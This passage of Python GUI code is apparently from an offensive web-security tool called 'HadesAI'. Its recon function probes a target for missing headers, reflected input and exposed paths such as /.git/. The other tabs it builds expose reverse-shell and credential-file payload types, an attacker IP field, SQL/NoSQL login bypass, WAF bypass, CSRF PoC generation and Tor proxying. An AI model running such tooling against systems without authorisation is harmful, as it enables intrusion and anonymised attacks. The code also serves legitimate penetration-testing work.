        self.findings_table.setHorizontalHeaderLabels(["Finding", "Details", "Status"])
        self.findings_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.findings_table.setMaximumHeight(200)
        right_layout.addWidget(self.findings_table)
        
        layout.addWidget(right, 2)
        return widget
    def _start_autorecon_scan(self):
        import requests
        from urllib.parse import urlparse, urlencode
        import hashlib

        url = self.autorecon_url_input.text().strip()

        # ---- URL validation ----
        if not url.startswith(("http://", "https://")):
            self.autorecon_output.setPlainText("❌ Please enter a valid URL (http:// or https://).")
            return

        self.autorecon_output.append(f"🔎 Scanning {url}...\n")

        findings = []
        patterns = []
        exploits = []

        headers = {
            "User-Agent": "HadesAI-AutoRecon/1.0"
        }

        try:
            response = requests.get(url, headers=headers, timeout=10)
            content = response.text[:50000]  # safety limit
        except Exception as e:
            self.autorecon_output.append(f"❌ Request failed: {e}")
            return

        # -------------------------------
        # 1. Passive HTML / Header Checks
        # -------------------------------
        security_headers = [
            "Content-Security-Policy",
            "X-Frame-Options",
            "X-Content-Type-Options",
            "Strict-Transport-Security",
            "Referrer-Policy"
        ]

        missing_headers = [
            h for h in security_headers if h not in response.headers
        ]

        if missing_headers:
            patterns.append({
                "pattern_type": "Missing Security Headers",
                "signature": ", ".join(missing_headers),
                "confidence": 0.6
            })

            exploits.append({
                "source_url": url,
                "exploit_type": "Misconfiguration",
                "code": "HTTP Response Headers",
                "description": (
                    "The following security headers were missing: "
                    f"{', '.join(missing_headers)}.\n\n"
                    "Reproduction:\n"
                    "1. Send a GET request to the site\n"
                    "2. Inspect response headers\n"
                    "3. Confirm missing protections"
                )
            })

        # -------------------------------
        # 2. Reflected Input Test (XSS-lite)
        # -------------------------------
        test_payload = "<hades_test>"
        parsed = urlparse(url)
        test_query = urlencode({"test": test_payload})
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"

        try:
            test_resp = requests.get(test_url, headers=headers, timeout=10)
            if test_payload in test_resp.text:
                patterns.append({
                    "pattern_type": "Reflected Input",
                    "signature": test_payload,
                    "confidence": 0.85
                })

                exploits.append({
                    "source_url": test_url,
                    "exploit_type": "Reflected Input / Potential XSS",
                    "code": test_payload,
                    "description": (
                        "User-supplied input was reflected in the response without sanitization.\n\n"
                        "Reproduction:\n"
                        f"1. Navigate to:\n   {test_url}\n"
                        "2. Observe reflected payload in response body\n"
                        "3. Replace payload with script to test XSS safely"
                    )
                })
        except:
            pass

        # -------------------------------
        # 3. Basic Directory Guessing (passive)
        # -------------------------------
        common_paths = ["/admin", "/login", "/backup", "/.git/"]
        for path in common_paths:
            try:
                r = requests.get(url.rstrip("/") + path, headers=headers, timeout=5)
                if r.status_code in (200, 401, 403):
                    patterns.append({
                        "pattern_type": "Exposed Endpoint",
                        "signature": path,
                        "confidence": 0.7
                    })

                    exploits.append({
                        "source_url": url.rstrip("/") + path,
                        "exploit_type": "Exposed Endpoint",
                        "code": path,
                        "description": (
                            f"Endpoint {path} is accessible (status {r.status_code}).\n\n"
                            "Reproduction:\n"
                            f"1. Visit {url.rstrip('/') + path}\n"
                            "2. Observe access behavior"
                        )
                    })
            except:
                continue

        # -------------------------------
        # 4. Store Results
        # -------------------------------
        for e in exploits:
            self.ai.kb.store_learned_exploit(
                source_url=e["source_url"],
                exploit_type=e["exploit_type"],
                code=e["code"],
                description=e["description"]
            )

        if patterns or exploits:
            self.ai.kb.store_web_learning(
                url=url,
                content_type="html",
                patterns=patterns,
                exploits=exploits
            )

        # -------------------------------
        # 5. Display Results
        # -------------------------------
        if not patterns:
            self.autorecon_output.append("ℹ️ No obvious issues detected.\n")
        else:
            for p in patterns:
                self.autorecon_output.append(
                    f"[{p['pattern_type']}] {p['signature']} | Confidence: {p['confidence']:.2f}"
                )

        self.autorecon_output.append("\n✅ Findings stored with reproduction steps.")

    def _create_findings_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        btn_layout = QHBoxLayout()
        refresh_btn = QPushButton("🔄 Refresh")
        refresh_btn.clicked.connect(self._refresh_findings)
        btn_layout.addWidget(refresh_btn)
        btn_layout.addStretch()
        layout.addLayout(btn_layout)
        
        splitter = QSplitter(Qt.Orientation.Vertical)
        
        self.findings_tree = QTreeWidget()
        self.findings_tree.setHeaderLabels(["Type", "Severity", "Path", "Browser"])
        self.findings_tree.setAlternatingRowColors(True)
        self.findings_tree.itemClicked.connect(self._show_finding_detail)
        splitter.addWidget(self.findings_tree)
        
        detail_group = QGroupBox("Code Snippet & Details")
        detail_layout = QVBoxLayout(detail_group)
        self.finding_code = QPlainTextEdit()
        self.finding_code.setReadOnly(True)
        self.finding_code.setFont(QFont("Consolas", 10))
        self.code_highlighter = PythonHighlighter(self.finding_code.document())
        detail_layout.addWidget(self.finding_code)
        splitter.addWidget(detail_group)
        
        splitter.setSizes([400, 300])
        layout.addWidget(splitter)
        
        self._refresh_findings()
        return widget
        
    def _create_learned_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        btn_layout = QHBoxLayout()
        refresh_btn = QPushButton("🔄 Refresh")
        refresh_btn.clicked.connect(self._refresh_learned)
        btn_layout.addWidget(refresh_btn)
        
        self.learn_url = QLineEdit()
        self.learn_url.setPlaceholderText("Enter URL to learn from...")
        btn_layout.addWidget(self.learn_url)
        
        learn_btn = QPushButton("📚 Learn from URL")
        learn_btn.clicked.connect(self._learn_from_url)
        btn_layout.addWidget(learn_btn)
        
        export_pdf_btn = QPushButton("📄 Export to PDF")
        export_pdf_btn.clicked.connect(self._export_to_pdf)
        export_pdf_btn.setStyleSheet("background: #0f3460;")
        btn_layout.addWidget(export_pdf_btn)
        
        self.clear_after_export = QCheckBox("Clear after export")
        self.clear_after_export.setToolTip("Delete all findings, exploits, and cache entries after exporting")
        self.clear_after_export.setStyleSheet("color: #ffa500;")
        btn_layout.addWidget(self.clear_after_export)
        
        layout.addLayout(btn_layout)
        
        splitter = QSplitter(Qt.Orientation.Vertical)
        
        self.learned_table = QTableWidget()
        self.learned_table.setColumnCount(4)
        self.learned_table.setHorizontalHeaderLabels(["Type", "Source", "Learned", "Success Rate"])
        self.learned_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.learned_table.itemClicked.connect(self._show_learned_code)
        splitter.addWidget(self.learned_table)
        
        code_group = QGroupBox("Exploit Code")
        code_layout = QVBoxLayout(code_group)
        self.learned_code = QPlainTextEdit()
        self.learned_code.setReadOnly(True)
        self.learned_code.setFont(QFont("Consolas", 10))
        code_layout.addWidget(self.learned_code)
        splitter.addWidget(code_group)
        
        layout.addWidget(splitter)
        
        self._refresh_learned()
        return widget
        
    def _create_cache_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        control_layout = QHBoxLayout()
        self.cache_scan_btn = QPushButton("🔎 Scan Browser Cache")
        self.cache_scan_btn.clicked.connect(self._start_cache_scan)
        control_layout.addWidget(self.cache_scan_btn)
        
        self.cache_stop_btn = QPushButton("⏹ Stop")
        self.cache_stop_btn.setEnabled(False)
        self.cache_stop_btn.clicked.connect(self._stop_cache_scan)
        control_layout.addWidget(self.cache_stop_btn)
        
        control_layout.addStretch()
        
        self.cache_progress = QProgressBar()
        self.cache_progress.setMaximumWidth(300)
        control_layout.addWidget(self.cache_progress)
        
        layout.addLayout(control_layout)
        
        self.cache_tree = QTreeWidget()
        self.cache_tree.setHeaderLabels(["Path", "Size", "Risk", "Browser", "Threats"])
        self.cache_tree.setAlternatingRowColors(True)
        layout.addWidget(self.cache_tree)
        
        stats_group = QGroupBox("Scan Statistics")
        stats_layout = QHBoxLayout(stats_group)
        self.cache_stats = QLabel("No scan performed yet")
        self.cache_stats.setFont(QFont("Consolas", 10))
        stats_layout.addWidget(self.cache_stats)
        layout.addWidget(stats_group)
        
        return widget
        
    def _create_exploit_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Target config
        config_group = QGroupBox("Exploitation Target")
        config_layout = QFormLayout(config_group)
        
        self.exploit_url = QLineEdit()
        self.exploit_url.setPlaceholderText("http://target.com/vulnerable.php")
        config_layout.addRow("Target URL:", self.exploit_url)
        
        self.exploit_param = QLineEdit()
        self.exploit_param.setPlaceholderText("cmd")
        config_layout.addRow("Parameter:", self.exploit_param)
        
        self.exploit_os = QComboBox()
        self.exploit_os.addItems(['linux', 'windows'])
        config_layout.addRow("Target OS:", self.exploit_os)
        
        self.exploit_type = QComboBox()
        self.exploit_type.addItems(['whoami', 'id', 'ls', 'dir', 'pwd', 'cat_passwd', 
                                    'ifconfig', 'netstat', 'ps', 'env', 'reverse_shell'])
        config_layout.addRow("Payload Type:", self.exploit_type)
        
        self.attacker_ip = QLineEdit()
        self.attacker_ip.setPlaceholderText("Your IP for reverse shells")
        config_layout.addRow("Attacker IP:", self.attacker_ip)
        
        self.attacker_port = QLineEdit()
        self.attacker_port.setText("4444")
        config_layout.addRow("Attacker Port:", self.attacker_port)
        
        layout.addWidget(config_group)
        
        # Buttons
        btn_layout = QHBoxLayout()
        
        gen_payloads_btn = QPushButton("⚡ Generate Payloads")
        gen_payloads_btn.clicked.connect(self._generate_exploit_payloads)
        btn_layout.addWidget(gen_payloads_btn)
        
        fuzz_btn = QPushButton("🎯 Fuzz Target")
        fuzz_btn.clicked.connect(self._fuzz_target)
        btn_layout.addWidget(fuzz_btn)
        
        layout.addLayout(btn_layout)
        
        # Results
        self.exploit_results = QTableWidget()
        self.exploit_results.setColumnCount(5)
        self.exploit_results.setHorizontalHeaderLabels(["Payload", "Status", "Length", "Indicators", "Vulnerable"])
        self.exploit_results.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        layout.addWidget(self.exploit_results)
        
        return widget
        
    def _create_injection_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Target
        target_layout = QHBoxLayout()
        target_layout.addWidget(QLabel("Target URL:"))
        self.injection_url = QLineEdit()
        self.injection_url.setPlaceholderText("http://target.com/api/login")
        target_layout.addWidget(self.injection_url)
        layout.addLayout(target_layout)
        
        # Injection type
        type_layout = QHBoxLayout()
        type_layout.addWidget(QLabel("Injection Type:"))
        self.injection_type = QComboBox()
        self.injection_type.addItems(['Header Injection', 'JSON Injection', 'WAF Bypass'])
        type_layout.addWidget(self.injection_type)
        
        self.json_payload_type = QComboBox()
        self.json_payload_type.addItems(['injection', 'type_juggling', 'ssrf'])
        type_layout.addWidget(self.json_payload_type)
        
        inject_btn = QPushButton("💉 Inject")
        inject_btn.clicked.connect(self._run_injection)
        type_layout.addWidget(inject_btn)
        
        layout.addLayout(type_layout)
        
        # Results
        self.injection_results = QTableWidget()
        self.injection_results.setColumnCount(5)
        self.injection_results.setHorizontalHeaderLabels(["Header/Payload", "Value", "Status", "Length", "Interesting"])
        self.injection_results.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        layout.addWidget(self.injection_results)
        
        return widget
        
    def _create_auth_bypass_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Login bypass
        login_group = QGroupBox("Login Bypass")
        login_layout = QFormLayout(login_group)
        
        self.login_url = QLineEdit()
        self.login_url.setPlaceholderText("http://target.com/login")
        login_layout.addRow("Login URL:", self.login_url)
        
        self.user_field = QLineEdit()
        self.user_field.setText("username")
        login_layout.addRow("Username Field:", self.user_field)
        
        self.pass_field = QLineEdit()
        self.pass_field.setText("password")
        login_layout.addRow("Password Field:", self.pass_field)
        
        self.bypass_type = QComboBox()
        self.bypass_type.addItems(['sql_auth_bypass', 'default_creds', 'nosql_bypass'])
        login_layout.addRow("Bypass Type:", self.bypass_type)
        
        bypass_btn = QPushButton("🔓 Try Bypass")
        bypass_btn.clicked.connect(self._try_login_bypass)
        login_layout.addRow("", bypass_btn)
        
        layout.addWidget(login_group)
        
        # CSRF bypass
        csrf_group = QGroupBox("CSRF Bypass")
        csrf_layout = QFormLayout(csrf_group)
        
        self.csrf_url = QLineEdit()
        self.csrf_url.setPlaceholderText("http://target.com/change-password")
        csrf_layout.addRow("Target URL:", self.csrf_url)
        
        csrf_btn = QPushButton("🛡️ Test CSRF Bypass")
        csrf_btn.clicked.connect(self._test_csrf_bypass)
        csrf_layout.addRow("", csrf_btn)
        
        poc_btn = QPushButton("📝 Generate PoC")
        poc_btn.clicked.connect(self._generate_csrf_poc)
        csrf_layout.addRow("", poc_btn)
        
        layout.addWidget(csrf_group)
        
        # Results
        self.auth_results = QTableWidget()
        self.auth_results.setColumnCount(5)
        self.auth_results.setHorizontalHeaderLabels(["Technique/Creds", "Status", "Length", "Potential Bypass", "Details"])
        self.auth_results.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        layout.addWidget(self.auth_results)
        
        return widget
        
    def _create_proxy_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        proxy_group = QGroupBox("Proxy Configuration")
        proxy_layout = QFormLayout(proxy_group)
        
        self.proxy_enabled = QCheckBox("Enable Proxy")
        self.proxy_enabled.stateChanged.connect(self._toggle_proxy)
        proxy_layout.addRow("", self.proxy_enabled)
        
        self.proxy_type_combo = QComboBox()
        self.proxy_type_combo.addItems(['tor', 'socks5', 'http', 'rotating'])
        proxy_layout.addRow("Proxy Type:", self.proxy_type_combo)
        
        self.proxy_host_input = QLineEdit()
        self.proxy_host_input.setText("127.0.0.1")
        proxy_layout.addRow("Host:", self.proxy_host_input)
        
        self.proxy_port_input = QSpinBox()
        self.proxy_port_input.setRange(1, 65535)
        self.proxy_port_input.setValue(9050)
        proxy_layout.addRow("Port:", self.proxy_port_input)
        
        self.proxy_user_input = QLineEdit()
        self.proxy_user_input.setPlaceholderText("Optional")
        proxy_layout.addRow("Username:", self.proxy_user_input)
        
        self.proxy_pass_input = QLineEdit()
        self.proxy_pass_input.setEchoMode(QLineEdit.EchoMode.Password)
        self.proxy_pass_input.setPlaceholderText("Optional")
        proxy_layout.addRow("Password:", self.proxy_pass_input)
        
        layout.addWidget(proxy_group)
        
        # Rotating proxies
        rotate_group = QGroupBox("Rotating Proxies (one per line)")
        rotate_layout = QVBoxLayout(rotate_group)
        self.proxy_list_input = QPlainTextEdit()
        self.proxy_list_input.setPlaceholderText("http://proxy1:8080\nhttp://proxy2:8080\nsocks5://proxy3:1080")
        self.proxy_list_input.setMaximumHeight(100)
        rotate_layout.addWidget(self.proxy_list_input)
        layout.addWidget(rotate_group)
        
        # Test & status
        btn_layout = QHBoxLayout()
        
        save_btn = QPushButton("💾 Save Settings")
        save_btn.clicked.connect(self._save_proxy_settings)
        btn_layout.addWidget(save_btn)
        
        test_btn = QPushButton("🔌 Test Connection")
        test_btn.clicked.connect(self._test_proxy)
        btn_layout.addWidget(test_btn)
        
        layout.addLayout(btn_layout)
        
        self.proxy_status = QLabel("Proxy: Disabled")
        self.proxy_status.setStyleSheet("font-size: 14px; padding: 10px;")
        layout.addWidget(self.proxy_status)
        
        layout.addStretch()
        return widget
    
    def _create_code_tab(self) -> QWidget:
        widget = QWidget()
        layout = QHBoxLayout(widget)
        
        left = QGroupBox("Code Input")
        left_layout = QVBoxLayout(left)
        self.code_input = QPlainTextEdit()
        self.code_input.setPlaceholderText("Paste code to analyze...")
        self.code_input.setFont(QFont("Consolas", 10))
        left_layout.addWidget(self.code_input)
        
        analyze_btn = QPushButton("🔍 Analyze Code")
        analyze_btn.clicked.connect(self._analyze_code)
        left_layout.addWidget(analyze_btn)
        layout.addWidget(left)
        
        right = QGroupBox("Vulnerabilities Found")
        right_layout = QVBoxLayout(right)
        self.vuln_tree = QTreeWidget()
        self.vuln_tree.setHeaderLabels(["Type", "Severity", "Line", "Match"])
        right_layout.addWidget(self.vuln_tree)
        layout.addWidget(right)
        
        return widget
    
    def _create_code_helper_tab(self) -> QWidget:
        """Code Helper tab - Apply AI instructions to transform code using GPT"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Info banner
        info_label = QLabel("🤖 GPT-Powered Code Assistant - Analyze, modify, and improve code with AI")
        info_label.setStyleSheet("background: #0f3460; padding: 10px; border-radius: 5px; font-size: 12px;")
        layout.addWidget(info_label)
        
        # GPT Status
        gpt_status = "✅ GPT Available" if HAS_OPENAI else "⚠️ GPT Not Available (pip install openai)"
        gpt_label = QLabel(gpt_status)
        gpt_label.setStyleSheet("color: #4CAF50;" if HAS_OPENAI else "color: #ff6b6b;")
        layout.addWidget(gpt_label)
        
        # File loading section
        file_group = QGroupBox("📂 File Operations")
        file_layout = QHBoxLayout(file_group)
        self.file_path_input = QLineEdit()
        self.file_path_input.setPlaceholderText("Enter file path to load...")
        file_layout.addWidget(self.file_path_input)
        
        load_btn = QPushButton("📂 Load File")
        load_btn.clicked.connect(self._load_code_file)
        load_btn.setStyleSheet("background: #0f3460;")
        file_layout.addWidget(load_btn)
        
        browse_btn = QPushButton("📁 Browse")
        browse_btn.clicked.connect(self._browse_code_file)
        browse_btn.setStyleSheet("background: #0f3460;")
        file_layout.addWidget(browse_btn)
        
        save_btn = QPushButton("💾 Save")
        save_btn.clicked.connect(self._save_code_file)
        save_btn.setStyleSheet("background: #4CAF50;")
        file_layout.addWidget(save_btn)
        layout.addWidget(file_group)
        
        # Code editor
        code_group = QGroupBox("💻 Code Editor")
        code_layout = QVBoxLayout(code_group)
        self.code_helper_text = QPlainTextEdit()
        self.code_helper_text.setPlaceholderText("Paste your code here or load a file...")
        self.code_helper_text.setFont(QFont("Consolas", 10))
        self.code_helper_text.setMinimumHeight(250)
        PythonHighlighter(self.code_helper_text.document())
        code_layout.addWidget(self.code_helper_text)
        layout.addWidget(code_group)
        
        # Instruction section
        instruction_group = QGroupBox("🎯 AI Instruction")
        instruction_layout = QHBoxLayout(instruction_group)
        self.code_instruction_input = QLineEdit()
        self.code_instruction_input.setPlaceholderText("Enter instruction (e.g., 'add error handling', 'optimize this loop', 'find bugs', 'add docstrings')...")
        self.code_instruction_input.returnPressed.connect(self._apply_code_instruction)
        instruction_layout.addWidget(self.code_instruction_input)
        
        apply_btn = QPushButton("🚀 Apply with GPT")
        apply_btn.clicked.connect(self._apply_code_instruction)
        instruction_layout.addWidget(apply_btn)
        
        analyze_btn = QPushButton("🔍 Analyze")
        analyze_btn.clicked.connect(self._gpt_analyze_code)
        analyze_btn.setStyleSheet("background: #0f3460;")
        instruction_layout.addWidget(analyze_btn)
        
        exec_btn = QPushButton("▶ Execute")
        exec_btn.clicked.connect(self._execute_code)
        exec_btn.setStyleSheet("background: #ff6b6b;")
        instruction_layout.addWidget(exec_btn)
        layout.addWidget(instruction_group)
        
        # Quick actions
        quick_group = QGroupBox("⚡ Quick Actions")
        quick_layout = QHBoxLayout(quick_group)
        quick_actions = [
            ("Add Error Handling", "add try/except error handling"),
            ("Add Docstrings", "add docstrings to all functions"),
            ("Find Bugs", "analyze for potential bugs and issues"),
            ("Optimize", "optimize this code for performance"),
            ("Add Logging", "add logging to all functions"),
            ("Security Check", "check for security vulnerabilities"),
        ]
        for label, instruction in quick_actions:
            btn = QPushButton(label)
            btn.clicked.connect(lambda checked, i=instruction: self._quick_instruction(i))
            btn.setStyleSheet("background: #0f3460; font-size: 10px; padding: 5px;")
            quick_layout.addWidget(btn)
        layout.addWidget(quick_group)
        
        # Result section
        result_group = QGroupBox("📋 Result / Output")
        result_layout = QVBoxLayout(result_group)
        self.code_helper_result = QPlainTextEdit()
        self.code_helper_result.setReadOnly(True)
        self.code_helper_result.setFont(QFont("Consolas", 10))
        self.code_helper_result.setMinimumHeight(200)
        result_layout.addWidget(self.code_helper_result)
        
        # Copy result button
        copy_btn = QPushButton("📋 Copy Result to Editor")
        copy_btn.clicked.connect(self._copy_result_to_editor)
        copy_btn.setStyleSheet("background: #0f3460;")
        result_layout.addWidget(copy_btn)
        layout.addWidget(result_group)
        
        return widget
    
    def _create_self_improvement_tab(self) -> QWidget:
        """Self-Improvement tab - Upload code and AI will fix/amend/verify it"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Info banner
        info_label = QLabel("🔧 HADES Self-Improvement Engine - Upload code for AI analysis, fixes, and verification")
        info_label.setStyleSheet("background: #e94560; padding: 10px; border-radius: 5px; font-size: 12px; font-weight: bold;")
        layout.addWidget(info_label)
        
        # AI Provider Selection
        provider_group = QGroupBox("🤖 AI Provider Configuration")
        provider_layout = QVBoxLayout(provider_group)
        
        # Provider selector row
        selector_layout = QHBoxLayout()
        selector_layout.addWidget(QLabel("Provider:"))
        self.si_provider_combo = QComboBox()
        self.si_provider_combo.addItems(["OpenAI (GPT)", "Mistral AI", "Ollama (Local - FREE)", "Azure OpenAI (Microsoft)"])
        self.si_provider_combo.currentIndexChanged.connect(self._si_on_provider_changed)
        selector_layout.addWidget(self.si_provider_combo)
        
        # Provider status labels
        openai_status = "✅" if HAS_OPENAI else "❌"
        mistral_status = "✅" if HAS_MISTRAL else "❌"
        ollama_status = "✅" if HAS_OLLAMA else "❌"
        azure_status = "✅" if HAS_AZURE_OPENAI else "❌"
        self.si_provider_status = QLabel(f"OpenAI:{openai_status} Mistral:{mistral_status} Ollama:{ollama_status} Azure:{azure_status}")
        self.si_provider_status.setStyleSheet("color: #888; font-size: 10px;")
        selector_layout.addWidget(self.si_provider_status)
        selector_layout.addStretch()
        provider_layout.addLayout(selector_layout)
        
        # Ollama model selector (only shown when Ollama is selected)
        ollama_layout = QHBoxLayout()
        ollama_layout.addWidget(QLabel("Ollama Model:"))
        self.si_ollama_model = QComboBox()
        self.si_ollama_model.addItems(["codellama", "llama3.2", "mistral", "deepseek-coder", "qwen2.5-coder", "phi3"])
        self.si_ollama_model.setEditable(True)  # Allow custom model names
        ollama_layout.addWidget(self.si_ollama_model)
        
        refresh_models_btn = QPushButton("🔄 Refresh")
        refresh_models_btn.clicked.connect(self._si_refresh_ollama_models)
        refresh_models_btn.setStyleSheet("background: #0f3460;")
        ollama_layout.addWidget(refresh_models_btn)
        
        self.si_ollama_info = QLabel("💡 Ollama is FREE - no API key needed!")
        self.si_ollama_info.setStyleSheet("color: #4CAF50; font-size: 10px;")
        ollama_layout.addWidget(self.si_ollama_info)
        ollama_layout.addStretch()
        
        self.si_ollama_layout_widget = QWidget()
        self.si_ollama_layout_widget.setLayout(ollama_layout)
        self.si_ollama_layout_widget.hide()  # Hidden by default
        provider_layout.addWidget(self.si_ollama_layout_widget)
        
        # Azure OpenAI configuration (only shown when Azure is selected)
        azure_layout = QVBoxLayout()
        
        azure_row1 = QHBoxLayout()
        azure_row1.addWidget(QLabel("Azure Endpoint:"))
        self.si_azure_endpoint = QLineEdit()
        self.si_azure_endpoint.setPlaceholderText("https://your-resource.openai.azure.com/")
        azure_row1.addWidget(self.si_azure_endpoint)
        azure_layout.addLayout(azure_row1)
        
        azure_row2 = QHBoxLayout()
        azure_row2.addWidget(QLabel("Deployment Name:"))
        self.si_azure_deployment = QLineEdit()
        self.si_azure_deployment.setPlaceholderText("your-deployment-name (e.g., gpt-35-turbo)")
        azure_row2.addWidget(self.si_azure_deployment)
        
        azure_row2.addWidget(QLabel("API Version:"))
        self.si_azure_api_version = QComboBox()
        self.si_azure_api_version.addItems(["2024-02-15-preview", "2023-12-01-preview", "2023-05-15"])
        self.si_azure_api_version.setEditable(True)
        azure_row2.addWidget(self.si_azure_api_version)
        azure_layout.addLayout(azure_row2)
        
        self.si_azure_info = QLabel("💡 Get these from Azure Portal > Your OpenAI Resource > Keys and Endpoint")
        self.si_azure_info.setStyleSheet("color: #888; font-size: 10px;")
        azure_layout.addWidget(self.si_azure_info)
        
        self.si_azure_layout_widget = QWidget()
        self.si_azure_layout_widget.setLayout(azure_layout)
        self.si_azure_layout_widget.hide()  # Hidden by default
        provider_layout.addWidget(self.si_azure_layout_widget)
        
        # API Key input row
        key_layout = QHBoxLayout()
        key_layout.addWidget(QLabel("API Key:"))
        self.si_api_key_input = QLineEdit()
        self.si_api_key_input.setPlaceholderText("Enter your API key...")
        self.si_api_key_input.setEchoMode(QLineEdit.EchoMode.Password)
        key_layout.addWidget(self.si_api_key_input)
        
        show_key_btn = QPushButton("👁")
        show_key_btn.setMaximumWidth(30)
        show_key_btn.clicked.connect(self._si_toggle_key_visibility)
        show_key_btn.setStyleSheet("background: #0f3460;")
        key_layout.addWidget(show_key_btn)
        
        save_key_btn = QPushButton("💾 Save")
        save_key_btn.clicked.connect(self._si_save_api_key)
        save_key_btn.setStyleSheet("background: #4CAF50;")
        key_layout.addWidget(save_key_btn)
        
        test_key_btn = QPushButton("🔌 Test")
        test_key_btn.clicked.connect(self._si_test_api_key)
        test_key_btn.setStyleSheet("background: #0f3460;")
        key_layout.addWidget(test_key_btn)
        
        provider_layout.addLayout(key_layout)
        layout.addWidget(provider_group)
        
        # Load saved keys and provider
        self._si_load_saved_config()
        
        # AI Status
        self.si_gpt_status_label = QLabel()
        self._si_update_gpt_status()
        layout.addWidget(self.si_gpt_status_label)
        
        # Main splitter
        main_splitter = QSplitter(Qt.Orientation.Horizontal)
        
        # Left side - Code input
        left_widget = QWidget()
        left_layout = QVBoxLayout(left_widget)
        
        # File operations
        file_group = QGroupBox("📂 Load HADES Source Files")
        file_layout = QVBoxLayout(file_group)
        
        # Quick load buttons for HADES files
        hades_files_layout = QHBoxLayout()
        
        load_main_btn = QPushButton("📄 Load HadesAI.py")
        load_main_btn.clicked.connect(lambda: self._si_load_hades_file("HadesAI.py"))
        load_main_btn.setStyleSheet("background: #0f3460;")
        hades_files_layout.addWidget(load_main_btn)
        
        load_personality_btn = QPushButton("🧠 Load personality_core_v2.py")
        load_personality_btn.clicked.connect(lambda: self._si_load_hades_file("modules/personality_core_v2.py"))
        load_personality_btn.setStyleSheet("background: #0f3460;")
        hades_files_layout.addWidget(load_personality_btn)
        
        file_layout.addLayout(hades_files_layout)
        
        # Custom file path
        custom_file_layout = QHBoxLayout()
        self.si_file_path = QLineEdit()
        self.si_file_path.setPlaceholderText("Or enter custom file path...")
        custom_file_layout.addWidget(self.si_file_path)
        
        browse_btn = QPushButton("📁 Browse")
        browse_btn.clicked.connect(self._si_browse_file)
        browse_btn.setStyleSheet("background: #0f3460;")
        custom_file_layout.addWidget(browse_btn)
        
        load_custom_btn = QPushButton("📥 Load")
        load_custom_btn.clicked.connect(self._si_load_custom_file)
        load_custom_btn.setStyleSheet("background: #0f3460;")
        custom_file_layout.addWidget(load_custom_btn)
        
        file_layout.addLayout(custom_file_layout)
        left_layout.addWidget(file_group)
        
        # Code editor
        code_group = QGroupBox("💻 Code to Analyze/Fix")
        code_layout = QVBoxLayout(code_group)
        
        self.si_code_editor = QPlainTextEdit()
        self.si_code_editor.setPlaceholderText("Paste code here or load a HADES source file...\n\nThe AI will analyze this code and suggest fixes, improvements, or verify correctness.")
        self.si_code_editor.setFont(QFont("Consolas", 10))
        self.si_code_editor.setMinimumHeight(300)
        PythonHighlighter(self.si_code_editor.document())
        code_layout.addWidget(self.si_code_editor)
        
        # Line count label
        self.si_line_count = QLabel("Lines: 0")
        self.si_line_count.setStyleSheet("color: #888;")
        self.si_code_editor.textChanged.connect(self._si_update_line_count)
        code_layout.addWidget(self.si_line_count)
        
        left_layout.addWidget(code_group)
        main_splitter.addWidget(left_widget)
        
        # Right side - Analysis and fixes
        right_widget = QWidget()
        right_layout = QVBoxLayout(right_widget)
        
        # Action buttons
        action_group = QGroupBox("🚀 AI Actions")
        action_layout = QVBoxLayout(action_group)
        
        # Primary actions row
        primary_actions = QHBoxLayout()
        
        analyze_btn = QPushButton("🔍 Analyze & Find Issues")
        analyze_btn.clicked.connect(self._si_analyze_code)
        analyze_btn.setStyleSheet("background: #e94560; font-size: 12px;")
        primary_actions.addWidget(analyze_btn)
        
        fix_btn = QPushButton("🔧 Auto-Fix Issues")
        fix_btn.clicked.connect(self._si_auto_fix)
        fix_btn.setStyleSheet("background: #4CAF50; font-size: 12px;")
        primary_actions.addWidget(fix_btn)
        
        verify_btn = QPushButton("✅ Verify Code")
        verify_btn.clicked.connect(self._si_verify_code)
        verify_btn.setStyleSheet("background: #0f3460; font-size: 12px;")
        primary_actions.addWidget(verify_btn)
        
        action_layout.addLayout(primary_actions)
        
        # Secondary actions row
        secondary_actions = QHBoxLayout()
        
        optimize_btn = QPushButton("⚡ Optimize")
        optimize_btn.clicked.connect(lambda: self._si_apply_action("optimize for performance and efficiency"))
        optimize_btn.setStyleSheet("background: #0f3460;")
        secondary_actions.addWidget(optimize_btn)
        
        security_btn = QPushButton("🔒 Security Audit")
        security_btn.clicked.connect(lambda: self._si_apply_action("perform security audit and fix vulnerabilities"))
        security_btn.setStyleSheet("background: #0f3460;")
        secondary_actions.addWidget(security_btn)
        
        refactor_btn = QPushButton("♻️ Refactor")
        refactor_btn.clicked.connect(lambda: self._si_apply_action("refactor for better code quality and readability"))
        refactor_btn.setStyleSheet("background: #0f3460;")
        secondary_actions.addWidget(refactor_btn)
        
        add_tests_btn = QPushButton("🧪 Add Tests")
        add_tests_btn.clicked.connect(lambda: self._si_apply_action("add unit tests for this code"))
        add_tests_btn.setStyleSheet("background: #0f3460;")
        secondary_actions.addWidget(add_tests_btn)
        
        action_layout.addLayout(secondary_actions)
        
        # Custom instruction
        custom_layout = QHBoxLayout()
        self.si_custom_instruction = QLineEdit()
        self.si_custom_instruction.setPlaceholderText("Enter custom instruction (e.g., 'add logging', 'fix the bug in function X', 'improve error handling')...")
        self.si_custom_instruction.returnPressed.connect(self._si_apply_custom_instruction)
        custom_layout.addWidget(self.si_custom_instruction)
        
        apply_custom_btn = QPushButton("▶ Apply")
        apply_custom_btn.clicked.connect(self._si_apply_custom_instruction)
        custom_layout.addWidget(apply_custom_btn)
        
        action_layout.addLayout(custom_layout)
